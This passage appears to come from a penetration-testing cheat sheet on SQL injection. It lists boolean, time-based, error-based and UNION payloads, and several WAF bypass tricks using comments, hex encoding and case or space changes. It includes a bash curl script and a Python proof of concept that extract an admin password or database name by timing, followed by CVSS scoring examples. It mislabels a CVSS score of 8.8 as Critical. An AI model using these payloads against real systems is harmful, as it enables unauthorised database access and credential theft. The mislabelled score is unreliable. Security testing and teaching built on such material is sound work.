' AND SLEEP(5) --
' AND BENCHMARK(10000000, MD5('a')) --
' OR '1'='1
1' UNION SELECT NULL --

### Error-Based
' AND extractvalue(1, concat(0x7e, (SELECT database()))) --

### UNION-Based
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 1,2,3,4,5 --

## WAF Bypass Techniques

### Comment Bypass
Standard: SELECT * FROM users
Bypass 1: SELECT /*! */ * FROM users
Bypass 2: SELECT /* comment */ * FROM users
Bypass 3: SELECT*FROM users (no space)
Bypass 4: SELECT+FROM users (space as +)

### Encoding Bypass
Hex: 0x53454c454354 (SELECT in hex)
Payload: ' UNION SELECT 0x7573657273 -- -

### Function Name Bypass
Standard: SELECT * FROM users
Bypass: SELECT * FROM /*!50000users*/
Bypass: SELECT * FROM `users`
Bypass: SELECT * FROM [users]

### Operator Variation
' OR 1=1 --
' OR 'a'='a
' OR 1 --
' OR true --
' OR '1'='1' --

### Space Removal
' OR'1'='1
'OR'1'='1
' /*!50000OR*/ '1'='1

### Case Variation
' uNiOn SeLeCt ...
' UNION SELECT ...
' Union Select ...

### Manual Time-Based Blind
```bash
#!/bin/bash
target="https://target.com/user?id="
payload="1' AND IF(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1)='a',SLEEP(5),0) -- -"

# If response takes >5s, character is 'a'
curl -s -w "Response time: %{time_total}s\n" "$target$(urlencode "$payload")"
```

### Python PoC
```python
import requests
import time

target = "https://target.com/product?id="
db_name = ""

for i in range(1, 10):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789_":
        payload = f"1' AND IF(SUBSTRING((SELECT database()),{i},1)='{char}',SLEEP(2),0) -- -"

        start = time.time()
        r = requests.get(target + payload, timeout=10, verify=False)
        elapsed = time.time() - start

        if elapsed >= 2:
            db_name += char
            print(f"[Found] Database: {db_name}")
            break
```

## CVSS Examples

### SQL Injection (Unauthenticated, Database Read)
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score: 7.5 (High)
- Direct database access
- No auth required
- No user interaction

### SQL Injection (Authenticated, with Data Exfiltration)
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Score: 8.8 (Critical)
- Full database compromise
- User authenticated but still critical
- Can dump all data, modify, delete

### Blind Time-Based SQL Injection
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
Score: 5.9 (Medium)
- Slower exploitation (timing dependent)
- But full data leak possible
- AC:H due to network/timing sensitivity
